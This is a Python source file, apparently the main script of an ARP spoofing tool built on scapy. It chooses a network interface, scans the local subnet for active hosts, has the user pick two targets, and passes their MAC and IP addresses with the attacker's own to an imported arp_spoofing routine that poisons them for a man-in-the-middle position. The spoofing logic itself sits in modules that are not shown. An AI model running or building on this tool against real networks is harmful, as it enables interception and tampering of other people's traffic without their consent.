from scapy.all import *
import netifaces as ni
import arp_spoofing as arp
import search_hosts as sh
import spoofing_tool as spoof

default_iface = "lo"

def main():
    conf.verb = 0

    iface = get_interface()

    spoof.printf("")
    spoof.printf("Searching for active hosts in the subnet...", 4)
    active_hosts = sh.search_hosts(iface)

    spoof.printf("Input IP address of the first target out of the active hosts:")
    first_target = validate_ip(active_hosts, "")
    
    spoof.printf("Input IP address of the second target out of the active hosts:")
    second_target = validate_ip(active_hosts, first_target)

    my_details = sh.get_my_details(iface)
    arp.arp_spoofing(first_target["mac"], first_target["ip"], second_target["mac"], second_target["ip"], my_details["mac"], my_details["ip"], iface)
    

def get_interface():
    # get available interfaces
    interfaces = get_if_list()

    # remove loopback interface (used to communicate with itself) if available
    try: 
        interfaces.remove("lo")
    except: 
        pass

    # set default interface
    try: 
        iface = ni.gateways()["default"][2][1]
    except:
        iface = default_iface

    # choose interface
    try:
        spoof.printf("Available interfaces:")
        for i in range(len(interfaces)):
            spoof.printf("\t"+str(i+1) + ": " + interfaces[i])
        spoof.printf("")

        spoof.printf("Choose interface("+str(1)+"-"+str(len(interfaces))+") or default(d):", 1)

        user_input = spoof.inputf(7)
        if user_input.lower() not in ["default","d"]:
            if user_input.strip().isdigit():
                iface = interfaces[int(user_input)-1]
            elif user_input in interfaces:
                iface = user_input
            else:
                raise # throw Exception
        spoof.printf("Chosen interface: " + iface)
    except:
        spoof.printf("Invalid input. Choosing default interface ({}).".format(iface), 0)

    return iface
    

def validate_ip(active_hosts, other_ip):
    ip_is_valid = False
    curr_ip = spoof.inputf(7)
    correct_tuple = {}

    for host in active_hosts:
        if (str(host["ip"]) == curr_ip):
            correct_tuple = host
            ip_is_valid = True
            break

    if (curr_ip == other_ip):
        spoof.printf("The second target cannot be the same as the first. Try again:")
        return validate_ip(active_hosts, other_ip)
    elif (ip_is_valid == True):
        return correct_tuple
    else:
        spoof.printf("Invalid IP. Try again:")
        return validate_ip(active_hosts, other_ip)

# call main
if __name__=="__main__":
    main()